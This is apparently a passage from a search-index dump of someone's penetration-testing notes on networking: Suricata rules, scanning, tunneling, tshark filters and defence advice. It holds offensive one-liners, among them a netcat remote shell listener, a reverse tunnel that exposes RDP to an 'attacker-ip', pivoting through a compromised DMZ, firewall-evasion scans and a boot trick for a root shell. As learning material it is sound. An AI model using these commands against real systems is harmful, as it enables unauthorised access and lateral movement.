- sources Reload: kill - USR2 $ ( pidof suricata ) Config: / etc / suricata / suricata . yaml HOME_NET \u2013 Internal network which is to be protected EXTERNAL_NET \u2013 External network; af - packet interface \u2013 Network interface which Suricata should use for monitoring. Logs: / var / log / suricata eve . json : Network events and alerts in Extensible Event Format suricata . log : Service messages fast . log : Network events and alerts in single line formatted. Rules: / var / lib / suricata / rules (OOTB rules are at / etc / suricata / rules ) Referenced from config file at rule - files section . Rule Types: Pass \u2013 let the packet through without generating an alert Drop \u2013 if matched, drop and logd Reject \u2013 similarly drop , and both the sender and receiver will receive a reject packet Alert \u2013 the packet is allowed through but an alert will be generated Supported porotocals: https://suricata.readthedocs.io/en/suricata-4.1.4/rules/intro.html#protocol Rule format: Source IP Source port - Destination IP Destination port Source IP Source port Destination IP Destination port Example: $ EXTERNAL_NET any - $ HOME_NET 22 Options: msg \u2013 information sid \u2013 unique ID number of the rule rev \u2013 version of the rule (incremented by 1 when the rule is updated) ( msg : Suspicious connection @ 1111 ; sid : 1111 ; rev : 1 ;) Example Rule: alert tcp $ EXTERNAL_NET any - $ HOME_NET 3306 ( msg : ET SCAN Suspicious inbound to mySQL port 3306 ; flow : to_server ; flags : S ; threshold : type limit , count 5 , seconds 60 , track by_src ; metadata : former_category POLICY ; reference : url , doc . emergingthreats . net / 2010937 ; classtype : bad-unknown ; sid : 2010937 ; rev : 3 ; metadata : created_at 2010_07_30 , updated_at 2018_03_27 ;) drop tcp any any - 10 . 33 . 33 . 1 any ( msg : TCP packet to malicious host, Drop ; sid : 10001 ;) drop tcp 10 . 33 . 33 . 1 any - any any ( msg : TCP packet from malicious host, Drop ; sid : 10002 ;) drop udp any any - 10 . 33 . 33 . 1 any ( msg : UDP packet to malicious host, Drop ; sid : 10003 ;) drop udp 10 . 33 . 33 . 1 any - any any ( msg : UDP packet from malicious host, Drop ; sid : 10004 ;) NFQUEUE : iptables and ip6tables target which delegates the decision on packets to a userspace software. When sudicata is installed in gateway: sudo iptables - I FORWARD - j NFQUEUE When installed on the host that should be protected: sudo iptables - I INPUT - j NFQUEUE sudo iptables - I OUTPUT - j NFQUEUE Example: iptables - t mangle - I PREROUTING - p tcp - m tcp --dport 80 -j NFQUEUE --queue-num 0 iptables - t mangle - I PREROUTING - p tcp - m tcp --sport 80 -j NFQUEUE --queue-num 0 iptables - t mangle - I PREROUTING - p udp - m udp --dport 53 -j NFQUEUE --queue-num 0 iptables - t mangle - I PREROUTING - p udp - m udp --sport 53 -j NFQUEUE --queue-num 0 Modes: nfq : mode : accept /repeat/ route repeat_mark : 1 # repeat mode option repeat_mask : 1 # repeat mode option route_queue : 2 # route mode option accept : the packet will not be inspected by the rest of the iptables rules repeat : the packets will be marked by Suricata and re-injected to the first rule of iptables. Looping is avoided by: iptables - I FORWARD - m mark ! --mark $MARK/$MASK -j NFQUEUE route : make sure the packet will be sent to another tool after being processed by Suricata Reload rules: suricatasc - c reload - rules References Beginner's Guide to Impacket Tool kit (Part 1) Let's code a TCP/IP stack, 1: Ethernet ARP: http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/ Let's code a TCP/IP stack, 2: IPv4 ICMPv4: http://www.saminiir.com/lets-code-tcp-ip-stack-2-ipv4-icmpv4/ Let's code a TCP/IP stack, 3: TCP Basics Handshake: http://www.saminiir.com/lets-code-tcp-ip-stack-3-tcp-handshake/ Practical man-in-the-middle attacks in computer networks - Mat\u02c7ej Plch: https://is.muni.cz/th/s8uf2/thesis.pdf","title":"Network"},{"location":"network/#quick-reference","text":"Cheat Sheets Nmap: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Wireshark: https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf TcpDump: https://packetlife.net/media/library/12/tcpdump.pdf Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533 Scapy: https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf Quick Reference How to Find Your Public IP Address on Linux Command Line : curl https : // ipaddr . pub MAC to IPv6: https://ben.akrin.com/?p=1347 take the mac address: for example 52 : 74 : f2 : b1 : a8 : 7 f throw ff : fe in the middle: 52:74:f2: ff : fe :b1:a8:7f reformat to IPv6 notation 5274 : f2ff : feb1 : a87f convert the first octet from hexadecimal to binary: 52 - 01010010 invert the bit at index 6 (counting from 0): 01010010 - 01010000 convert octet back to hexadecimal: 01010000 - 50 replace first octet with newly calculated one: 5074 : f2ff : feb1 : a87f prepend the link-local prefix: fe80 :: 5074 : f2ff : feb1 : a87f https://stackoverflow.com/questions/27693120/convert-from-mac-to-ipv6 format_eui_64 () { local macaddr = $1 printf %02x%s $ (( 16 #$ { macaddr : 0 : 2 } ^ 2 # 00000010 )) ${macaddr:2} \\ | sed - E - e s / ([ 0 - 9 a - zA - Z ]{ 2 }) */ 0 x \\ 0 |/ g \\ | tr - d : \\ n \\ | xargs - d | \\ printf %02x%02x:%02xff:fe%02x:%02x%02x } HTTP Request with / dev / tcp exec 3 /dev/tcp/ ( INTERNAL IP ADDRESS ) /80 echo -e GET / HTTP/1.1\\r\\nHost: (INTERNAL IP ADDRESS)\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/5.0 (X11;Linux x86_64...) Gecko/20100101 Firefox/60.0\\r\\n\\r\\n 3 cat 3 TCP Flag Key: http://rapid.web.unc.edu/resources/tcp-flag-key/ Network Discovery nmap - sn target addresses # disable port scanning ( keep discovery enabled ) nmap - sP 192 . 168 . 1 . 1 - 255 ettercap - T - i eth0 /// netdiscover - i ens33 IPv6 ping ( TARGET IP ADDRESS ) arp - a Virtual firewall bypass https://0xdf.gitlab.io/2019/04/06/htb-vault.html route check routing table and look for the firewall node (gateways) ip addr add 192 . 168 . 5 . 3 / 24 dev ens3 add a new network interface route delete - net 192 . 168 . 5 . 0 gw 192 . 168 . 122 . 5 netmask 255 . 255 . 255 . 0 remove rule that's doing traffic forwarding to firewall time for i in $ ( seq 1 254 ) ; do (ping -c 1 192.168.5.${i} | grep bytes from ); done host scan iptables - L to get an idea about any blocking rules Simple Protocol for Independent Computing Environments (SPICE) https://en.wikipedia.org/wiki/Simple_Protocol_for_Independent_Computing_Environments https://0xdf.gitlab.io/2019/04/06/htb-vault.html ps - auxww | grep - F spice port apt install remmina remmina - plugin - spice Send alt + ctrl + del to restart Send e to do to recovery mode Scroll down to the line that starts with linux Change ro to rw , and add init =/ bin / bash to the end Save reboot","title":"Quick Reference"},{"location":"network/#network-security-monitoring","text":"Prevention eventually fails. One version of this philosophy is that security breaches are inevitable Prevention mechanisms can block some malicious activity, but it\u2019s increasingly difficult for organizations to defend themselves as adversaries adopt more sophisticated tactics. NSM is threat-centric, meaning adversaries are the focus of the NSM operation. Continuous Monitoring (CM) is vulnerability-centric, focusing on configuration and software weaknesses. NMS is a strategy backed by tactics that focus on visibility, not control. http://nsmwiki.org/ Placed outside of NAT/NPAT, so that the NSM sees actual source IP of traffic configure switch to send copies of the traffic they see to an otherwise unused switch port. Cisco calls this technique the Switched Port Analyzer . Juniper and Dell use the term port mirroring . intruders could disable a SPAN port in order to hide some of their activities or use network taps that provide separate ports with copies of network traffic. (Net Optics iTap Port Aggregator) Network address translation (NAT) Network port address translation (NPAT or PAT). Each translation device rewrites the wireless or internal source IP address to be a single IP value, and uses changing source ports to differentiate among sending computers. As with NAT, each translation device maintains a table to track any changes. Computers use the combination of source IP address, source port, destination IP address, destination port, and IP protocol to identify unique connections. Ports are the key in the translation process, as they permit several private IP addresses to be hidden behind a single public IP address. Recommendations Limit command shell access to the system to only those administrators who truly need it. Analysts should log in to the sensor directly only in an emergency. Instead, they should access it through tools that allow them to issue commands or retrieve data from the sensor. Administrators should never share the root account, and should never log in to sensors as the root account. If possible, access the sensor using shared keys, or use a two-factor or two-step authentication system like Google Authenticator. Always administer the sensor over a secure communications channel like OpenSSH. Do not centrally administer the sensor\u2019s accounts using the same system that manages normal IT or user assets. Always equip production sensors with remote-access cards. Assume the sensor is responsible for defending itself. Limit the expo- sure of services on the sensor, and keep all services up-to-date. Export logs from the sensor to another platform so that its status can be remotely monitored and assessed. If possible, put the sensor\u2019s management interface on a private network reserved for management only. If possible, use full disk encryption to protect data on the sensor when it is shut down. Create and implement a plan to keep the sensor software up-to-date. Treat the system like an appliance, but maintain it as a defensible platform. Tools Xplico ( http://www.xplico.org/ ) can rebuild a web page whose content was captured in network form Session Data / Transaction Data Bro ( http://www.bro.org/ ) can generate many types of logs based on its inspection of network traffic Argus ( http://www.qosient.com/argus/ ) can also generate records for this traffic Sguil ( http://www.sguil.net/ ) can also be used to view session data SANCP tool (http://nsmwiki .org/SANCP) to collect session data and render Statistical Data Capinfos of Wireshark Metadata RobTex ( http://www.robtex.com ) offers a free resource to show routing data Alert Data Snort (http:// www.snort.org/ ) Suricata ( http://suricata-ids.org/ ) Consoles: Sguil or Snorby (http:// www.snorby.org/ ) - Snorby is a web-based tool, whereas Sguil is a \u201cthick client\u201d that users install on their desktops Security Onion (SO) NSM suite Linux distro for IDS and NSM Snort Suricata Sguil Squert: View NIDS/HIDS alerts and HTTP logs Snorby: View and annotate IDS logs ELSA: Seach logs (IDS, Bro, syslog) Xplico: Carve PCAP files sudo service nsm status curl www . testmyids . com Create separate user for each sensor (SSH)","title":"Network Security Monitoring"},{"location":"network/#port-scanning","text":"FPing: for ip in $ ( seq 1 254 ) ;do fping 10.11.1.$ip fping.txt;done;grep alive ./fping.txt Nc: for ip in $ ( seq 1 5 ) ; do nc -nvv -z 192.168.1.$ip 80 /tmp/ncscan.txt done nc - z - v ( TARGET IP ADDRESS ) 1 - 1024 2 / dev / stdout | grep - v refused ARP ping: nmap - sP - PR 10 . 11 . 1 . 0 / 24 - oG nmap - arp . txt Ping: for ip in $ ( seq 1 254 ) ;do ping -c 1 192.168.1.$ip | grep bytes from | cut -d -f4 | cut -d : -f1 done /dev/tcp: for port in $ ( seq 1 65530 ) ; do (echo $port /dev/tcp/$target/$port printf [!] $port is open.\\n ) 2 /dev/null done Port monitor watch -n1 nc -w1 -nvz 192 .168.1.23 123 # -w1: timeout 1 sec, -n: no reverse lookup, -v: verbose, -z: no IO, act as a scanner Nmap: Evade Firewall - sA - TCP ACK Scan Because of the ACK packets the firewall cannot create the log Firewalls treat ACK packet as the response of the SYN packet - Open port (few ports in the case of the firewall) Closed port (most ports are closed because of the firewall) Filtered (Nmap is not sure whether the port is open or not) Unfiltered (Nmap can access the port but is still confused about the open status of the port) - sW - TCP Window Scan Designed to differentiate between open and closed ports instead of showing unfiltered Does not open any active session with the target computer Send ACK packets and receive a single RST packet in response - f , - ff - Fragment Packets - spoof - mac Cisco - Spoof MAC - scan_delay - control the delay between each and every request - host - timeout Types of port scans TCP Connect Scan: nc - nvv - w 1 - z ip port - range Full 3 way handshake SYN / Stealth Scan Send SYN SYN-ACK means open RST means closed UDP Scanning: nc - nv - u - z - w 1 ip port - range ICMP port unreachable means closed No response means open Port Knocking: for x in 1111 , 2222 , 3333 ; do nmap -Pn --host_timeout 201 --scan-delay 0.2 --max-retries 0 -p $x IP ; done Look for: knockd Configured at: \u200b / etc / knockd . conf \u200b Scanning Methods All TCP and UDP fast scan: masscan -p1-65535,U:1-65535 IP --rate = 1000 -e tun0 -p1-65535,U:1-65535 ports ports = $( cat ports | awk -F {print $4} | awk -F / {print $1} | sort -n | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP Quick all TCP scan using Nmap only: ports =( nmap -p- --min-rate = 1000 -T4 IP | grep ^ [ 0 -9 ] | cut -d / -f 1 | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP Quick all TCP and UDP scan using Nmap only: ports =( nmap -p- --min-rate = 1000 -T4 IP | grep ^ [ 0 -9 ] | cut -d / -f 1 | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP nmap -sS -T5 -A -f -v IP nmap -n -Pn -sV --version-all --open -sC -oA [ target ] --stats-every 120 nmap -T4 -sV -sC -Pn [ box ip ] -oA [ box_name ] _initial_scan Vulnerability Scanning Nmap nmap -v -p 80 --script http-vuln-cve2010-2861 ip nmap -v -p 80 --script all ip nmap -v -p 80 -sC ip nmap -v -p 80 --script default,safe ip OpenVAS openvas - setup https : // ip : 9392","title":"Port Scanning"},{"location":"network/#port-forwarding-tunneling","text":"Local: ssh gateway -L local port to listen : remote host : remote port Remote: ssh gateway -R remote port to bind : local host : local port Dynamic: ssh gateway -D port to bind Local: plink.exe gateway -L local port to listen : remote host : remote port Remote: plink.exe gateway -R remote port to bind : local host : local port Dynamic: plink.exe gateway -D port to bind","title":"Port Forwarding / Tunneling"},{"location":"network/#local-port-forwarding","text":"https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot ssh -L local-port-to-listen : remote-host : remote-port gateway Allow connections to a specific blocked server. From work login to home and use it as a gateway to access banned - site . com : 80 : ssh -L 9001 :banned-site.com:80 user@home #work curl http://localhost:9001 #home ssh -L 9001 :banned:22 user@home ssh -p 9001 localhost Allow remote connections to local port forwards (listening on all interfaces) ssh -L 9001 :banned:22 user@home -g ssh -p 9001 work_machine #remotely Access a port on your server which can only be accessed from localhost and not remotely. Server acts as the gateway and binds server's port 5432 to local port 9000. ssh -L 9000 :localhost:5432 user@server psql -h localhost -p 9000","title":"Local Port Forwarding"},{"location":"network/#remote-port-forwarding","text":"https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot Allow remote access to restricted network. Server will bind port 9001 on home machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to localhost : 9001 in home will forward user to intra:22 ssh -R 9001 :intra-ssh-server:22 user@home #work ssh -p 9001 localhost #home Add GatewayPorts yes to sshd_config to listening on all interfaces. Allow public access to a local resource through a public server. ssh -R 9000 :localhost:3000 user@public_sever sudo vim /etc/ssh/sshd_config GatewayPorts yes sudo service ssh restart","title":"Remote Port Forwarding"},{"location":"network/#dynamic-port-forwarding","text":"One local port for tunneling data to all remote destinations (SOCKS protocol) ssh -D 9001 home ssh -fND 9001 home echo socks5 127.0.0.1 9999 / etc / proxychains . conf curl http : // 192 . 168 . 122 . 4 proxychains curl 192 . 168 . 122 . 4","title":"Dynamic port forwarding"},{"location":"network/#quick-reference_1","text":"Monitoring Tunnels: netstat - tunelp Avoid TTL: - nNT Creating reverse SSH client to tunnel-out remote desktop port FROM remote non-routable machine pling -l root -pw password attacker-ip -R 3390 :127.0.0.1:3389 # localhost 3389 to attacker ip 3389 FROM attacker's machine rdesktop localhost:3390 SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs) Create local SOCS4 proxy: From attacker's machine (compromised DMZ) ssh -D 8080 root@DMZ-IP netstat -antp | grep 8080 /etc/proxychains.conf socks4 127 .0.0.1 8080 proxychains nmap -p 3389 -ST -Pn non-routable-remote-ip-range --oepn proxychains rdesktop rdp-ip-in-non-routable-range Ncat: Forward local 1234 to command sudo / usr / bin / ncat - l 1234 -- sh - exec ncat 192.168.5.2 987 -p 53 Tools rinetd When outbound only 80 / 443 use port forwarding (ip1:80 will proxy for ip2:3389) nano / etc / rinetd . conf ip1 80 ip2 3389 bindaddress bindport connectaddress connectport XFLTReaT tunnelling framework: https://github.com/earthquake/XFLTReaT TCP UDP ICMP SOCKS v4 , 4 a , 5 HTTP CONNECT SCTP ( by Darren Martyn @ info_dox ) WebSocket DNS ( A / CNAME , PRIVATE , NULL ) - Proof of Concept RDP ( Windows only ) https://github.com/sshuttle/sshuttle https://github.com/klsecservices/rpivot https://github.com/wolfSSL/wolfssh https://github.com/jpillora/chisel References https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html New References https://vimeo.com/54505525","title":"Quick Reference"},{"location":"network/#tools","text":"Inject code and spy on wifi users: https://github.com/DanMcInerney/LANs.py Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts CyberScan: Network's Forensics ToolKit Sparta: https://github.com/SECFORCE/sparta BetterCap - Swiss army knife for network attacks and monitoring: https://www.bettercap.org/ Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter Nmap Port Related Information: / usr / share / nmap / nmap - servies ICMP (Ping) Sweep: nmap - sn pi - rage nmap - sn ip - range - oG filename ( grepable format ) Sweep TCP/UDP ports: nmap - p 80 ip - range - oG filename Sweep full network for top ports: nmap - sT - A --top-ports=20 ip-range -G filename Script engine: ls - l / usr / share / nmap / scripts | grep smb Important flags - O for OS Fingerprinting - sV for banner grabbing Netstat Kernel IP routing table: netstat - nr Listening ports: netstat - lp netstat - lvnp Netcat Cheat sheet: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf General Commands Listen on port 567/TCP: nc - l - p 567 Connecting to 567 of 1.2.3.4: nc 1 . 2 . 3 . 4 5676 Pipe a text file to the listener: cat infile | nc 1 . 2 . 3 . 4 567 - q 10 Have the listener save a received text file: nc - l - p 567 textfile Transfer a directory: Reciever: nc - l - p 678 | tar xvfpz Sender: tar zcfp - / path / to / directory | nc - w 3 1 . 2 . 3 . 4 678 Send a message to your syslog server (the 0 means emerg): echo 0 message | nc - w 1 - u syslogger 514 Setup a remote shell listener: nc - v - e /bin/bash - l - p 1234 - t nc l p 1234 e c:\\windows\\system32\\cmd.exe Make an HTTP request: echo - e GET http://www.google.com HTTP/1.0nn | nc - w 5 www . google . com 80 One-page webserver: cat homepage . txt | nc - v - l - p 80 General Options Use IPv4 addressing only: nc - 4 [ options ] [ host ] [ port ] Use IPv6 addressing only: nc - 6 [ options ] [ host ] [ port ] UDP instead of TCP: nc - u [ options ] [ host ] [ port ] Listen for an incoming connection: nc - l [ host ] [ port ] Continue listening after client has disconnected: nc - k - l [ host ] [ port ] No DNS lookups: nc - n [ host ] [ port ] Use specific source port: nc - p [ source port ] [ host ] [ port ] Use source IP: nc - s [ source ip ] [ host ] [ port ] Apply 'n' second timeout: nc - w [ timeout ] [ host ] [ port ] Verbose output: nc - v [ host ] [ port ] Port Scanning Scan a single TCP port: nc - zv hostname . com 80 Scan a range of ports: nc - zv hostname . com 80 - 84 Scan multiple ports: nc - zv hostname . com 80 84 Other One page web server: while : ; do ( echo -ne HTTP/1.1 200 OK\\r\\nContent-Length: $(wc -c index.html)\\r\\n\\r\\n ; cat index.html; ) | nc -l -p 8080 ; done Proxy: mknod backpipe p ; nc - l [ proxy port ] backpipe | nc [ destination host ] [ destination port ] pipe Wrap readline history library (support up arrow, etc): rlwrap nc - t remotehost 23 References: https://kapeli.com/cheat_sheets/Netcat.docset/Contents/Resources/Documents/index http://workrobot.com/sysadmin/security/netcat_cheatsheet.html","title":"Tools"},{"location":"network/#techniques","text":"","title":"Techniques"},{"location":"network/#domain-fronting","text":"Tools Psiphon: https://www.psiphon3.com/en/index.html Meek: https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek References Introduction: https://www.andreafortuna.org/cybersecurity/privacy/domain-fronting-in-a-nutshell/ Usage in APT29: https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html Azure (Hardening Your Azure Domain Front): https://medium.com/@rvrsh3ll/hardening-your-azure-domain-front-7423b5ab4f64 A 101 on Domain Fronting: https://digi.ninja/blog/domain_fronting.php Domain Fronting with CloudFront: https://digi.ninja/blog/cloudfront_example.php","title":"Domain Fronting"},{"location":"network/#traffic-analysis","text":"Accounting Traffic #!/bin/bash # Reset counters and iptables rules iptables -Z iptables -F # Measure incoming traffic from lab machine iptables -I INPUT 1 -s 192 .168.1.23 -j ACCEPT # Measure outgoing traffic to lab machine iptables -I OUTPUT 1 -d 192 .168.1.23 -j ACCEPT watch - n 1 iptables - nvL Using a Capture: aircrack - ng captured . cap \u200b Netcap - A framework for secure and scalable network traffic analysis: https://github.com/dreadl0ck/netcap PCAP Samples: Netresec: https://www.netresec.com/?page=pcapfiles Malware Traffic Analysis: https://www.malware-traffic-analysis.net/ Packettotal (Just like virustotal but for PCAP Analysis): https://packettotal.com/ https://wiki.wireshark.org/SampleCaptures PA Toolkit (Pentester Academy Wireshark Toolkit) - PA Toolkit is a collection of traffic analysis plugins to extend the functionality of Wireshark from a micro-analysis tool and protocol dissector to the macro analyzer and threat hunter: https://github.com/pentesteracademy/patoolkit CapAnalysis: https://drive.google.com/uc?authuser=0 id=1Lf8yU7alFZdRlT6WstKjngN2RAp-1jG8 export=download Netsh (Windows) netsh trace show capturefilterhelp netsh trace show scenarios netsh trace show globalkeywordsandlevel netsh trace start capture = yes IPv4 . Address = 192 . 168 . 122 . 2 netsh trace start scenario = InternetClient , InternetServer , NetConnection globalLevel = win : Verbose capture = yes report = yes traceFile = C : \\ temp \\ trace \\ trace001 . etl netsh trace stop Use Microsoft Network Monitor 3.4 to view: https://www.microsoft.com/en-us/download/details.aspx?id=4865 Convert to PAC from: https://github.com/microsoft/etl2pcapng Use powershell to convert: $s = New-PefTraceSession -Path \u201c C : \\ output \\ path \\ spec \\ OutFile . Cap \u201d -SaveOnStop $s | Add-PefMessageProvider -Provider \u201c C : \\ input \\ path \\ spec \\ Input . etl \u201d $s | Start-PefTraceSession tcpdump to show HTTP request/response headers https://serverfault.com/questions/504431/human-readable-format-for-http-headers-with-tcpdump sudo tcpdump -A -s 10240 tcp port 4080 and (((ip[2:2] - ((ip[0] 0xf) 2)) - ((tcp[12] 0xf0) 2)) != 0) | egrep --line-buffered ^........(GET |HTTP\\/|POST |HEAD )|^[A-Za-z0-9-]+: | sed -r s/^........(GET |HTTP\\/|POST |HEAD )/\\n\\1/g sudo stdbuf -oL -eL /usr/sbin/tcpdump -A -s 10240 tcp port 4080 and (((ip[2:2] - ((ip[0] 0xf) 2)) - ((tcp[12] 0xf0) 2)) != 0) | egrep -a --line-buffered .+(GET |HTTP\\/|POST )|^[A-Za-z0-9-]+: | perl -nle BEGIN{$|=1} { s/.*?(GET |HTTP\\/[0-9.]* |POST )/\\n$1/g; print } tcpdump tcpdump - i eth1 - s 0 port not 22 tcpdump - i eth1 - s 0 port not 22 and port not 53 tcpdump - i eth1 port not 22 and host 1 . 2 . 3 . 4","title":"Traffic Analysis"},{"location":"network/#tshark","text":"General Supported network interfaces: tshark - D Sniff on eth0: tshark - i eth0 Open pcap : tshark - r HTTP_traffic . pcap Read 100 packets from pcap : tshark - r HTTP_traffic . pcap - c 100 Print full details for first 10 Packets: tshark - r HTTP_traffic . pcap - c 10 - V List of protocols in pcap : tshark - r HTTP_traffic . pcap - z io , phs - q Export into PDML: tshark - r HTTP_traffic . pcap - T pdml http . xml PDML to HTML: xsltproc / usr / share / wireshark / pdml2html . xsl http . xml http . html HTTP Only the HTTP traffic: tshark - Y http - r HTTP_traffic . pcap IP packets sent from IP address 192.168.252.128 to 52.32.74.91?: tshark - r HTTP_traffic . pcap - Y ip.src==192.168.252.128 ip.dst==52.32.74.91 Packets containing GET requests: tshark - r HTTP_traffic . pcap - Y http.request.method==GET Print only source IP and URL for all GET request packets: tshark - r HTTP_traffic . pcap - Y http.request.method==GET - Tfields - e frame . time - e ip . src - e http . request . full_uri Packets contain the \"password\" string: tshark - r HTTP_traffic . pcap - Y http contains password \u201d Destination IP for GET requests sent to New York Times ( www.nytimes.com ): tshark - r HTTP_traffic . pcap - Y http.request.method==GET http.host==www.nytimes.com - Tfields - e ip . dst Session ID being used by 192.168.252.128 for Amazon India store (amazon.in)?: tshark - r HTTP_traffic . pcap - Y ip contains amazon.in ip.src==192.168.252.128 - Tfields - e ip . src - e http . cookie Type of OS 192.168.252.128 is using: tshark - r HTTP_traffic . pcap - Y ip.src==192.168.252.128 http - Tfields - e http . user_agent HTTPS Only show SSL traffic?: tshark - r HTTPS_traffic . pcap - Y ssl Only print the source IP and destination IP for all SSL handshake packets: tshark - r HTTPS_traffic . pcap - Y ssl.handshake - Tfields - e ip . src - e ip . dst List issuer name for all SSL certificates exchanged: tshark - r HTTPS_traffic . pcap - Y ssl.handshake.certificate - Tfields - e x509sat . printableString Print the IP addresses of all servers accessed over SSL: tshark - r HTTPS_traffic . pcap - Y ssl ssl.handshake.type==1 - Tfields - e ip . dst IP addresses associated with Ask Ubuntu servers (askubuntu.com): tshark - r HTTPS_traffic . pcap - Y ip contains askubuntu The IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com) tshark - r HTTPS_traffic . pcap - Y ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69 - Tfields - e ip . src What DNS servers were used: tshark - r HTTPS_traffic . pcap - Y dns dns.flags.response==0 - Tfields - e ip . dst Name of the antivirus solution: tshark - r HTTPS_traffic . pcap - Y ip contains avast - Tfields - e ip . src WiFi Show only WiFi traffic: tshark - r WiFi_traffic . pcap - Y wlan View the deauthentication packets: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==0x000c Display WPA handshake packets: tshark - r WiFi_traffic . pcap - Y eapol Print the SSID and BSSID values for all beacon frames: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==8 - Tfields - e wlan . ssid - e wlan . bssid What is BSSID of SSID \"LazyArtists\": tshark - r WiFi_traffic . pcap - Y wlan.ssid==LazyArtists - Tfields - e wlan . bssid Channel of SSID \"Home_Network\": tshark - r WiFi_traffic . pcap - Y wlan.ssid==Home_Network - Tfields - e wlan_radio . channel Devices that received deauth messages: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==0x000c - Tfields - e wlan . ra Which device does MAC 5c:51:88:31:a0:3b belongs to: tshark - r WiFi_traffic . pcap - Y wlan.ta==5c:51:88:31:a0:3b http - Tfields - e http . user_agent Beacon frames present: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 Unique list of all AP BSSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . bssid | sort | uniq Unique list of all AP SSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . ssid | sort | uniq Only non-null SSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 !(wlan.tag.length ==0) - T fields - e wlan . ssid | sort | uniq Unique list of SSID and BSSIDs side by side for all AP networks: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . ssid - e wlan . bssid | sort | uniq VoIP Show VoIP traffic: tshark - r VoIP_traffic . pcap - Y sip or rtp Print all REGISTER packets: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER Only print the source IP, sender extension and authorization digest response for REGISTER packets: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER - Tfields - e ip . src - e sip . from . user - e sip . auth . digest . response Print all codecs being used by RTP protocol: tshark - r VoIP_traffic . pcap - Y sdp - Tfields - e sdp . media User who is using the Zoiper VoIP client: tshark - r VoIP_traffic . pcap - Y sip contains Zoiper - Tfields - e ip . src IP address of the SIP server used to place calls: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER - Tfields - e ip . dst Content of the text message sent to +918108591527?: tshark - r VoIP_traffic . pcap - Y sip.Method == MESSAGE - V ( Read the content ) Extensions completed a call successfully: tshark - r VoIP_traffic . pcap - Y sip.Method==BYE - Tfields - e sip . from . user - e sip . to . user","title":"TSHark"},{"location":"network/#defense","text":"Phishing Blacklist: https://www.phishing.army/ Open Source Security (OSSEC) is a free, open-source, host-based intrusion detection system (HIDS) log analysis portion of OSSEC as a log-based intrusion detection system (LIDS) OSSEC is a virtual appliance based on CentOS and includes Elastic search-Logstash-Kibana (ELK) Atomic rules are based on a single event occurring, while a composite rule is based on patterns across multiple logs. Hamachi by LogMeIn is a cloud-based, professional-level application that allows you to easily create a virtual private network (VPN)","title":"Defense"},{"location":"network/#ipv6","text":"Disallow traffic from unallocated IP address spaces Implement Anti-Spoofing perimeter ACL: No packet with a source address of your network allocation can ENTER your network. No packet with a destination address of your network allocation can LEAVE your network. Two categories of traffic Traffic initiated from perimeter security device Traffic that is in-transit across perimeter Transit Traffic Transit Traffic Category Recommendations Start with a DENY ALL approach, and then allow selectively. Ensures that all unassigned/experimental types are DROPPED. Allow Type 1: Destination Unreachable. Filter selectively allowing only specific codes such as code 4 - port unreachable. Allow Type 2: Packet too large. (Do not break path MTU discovery) Allow Type 3, Code 0 only. (TTL/Hop limit expired) Allow Type 4, Codes 0 and 1 only related to header errors. Transit traffic filtering continued\u2026 Optionally allow ICMP types 128/129 (echo request/reply) based on local ICMP security policy. Allow ICMP types 144 through 147 ONLY if your IPv6 network is \u201cmobility enabled\u201d. Many may choose to leave this in default drop state. Optionally allow ICMP Multicast related messages (types 151 - 153). ONLY applicable if you participate in global multicast sourcing. ICMP type 137 (Redirect) represents a direct security threat and should always be dropped at the perimeter. Non-transit Traffic initiated from perimeter security devices Again start with a DENY ALL policy Use the same recommendations as transit above with the exception of the mobility enabled class Additional messages to ALLOW should be: Types 133/134: Router solicitation / advertisement Types 135/136: Neighbor solicitation / advertisement Types 141/142: Inverse neighbor solicitation / advertisement Multicast Filtering Likely assumption for most is to not participate in global/inter-domain multicast Any packet with a multicast source address should be dropped Reserved and unused multicast destinations should be dropped. Probably most other multicast destinations will be 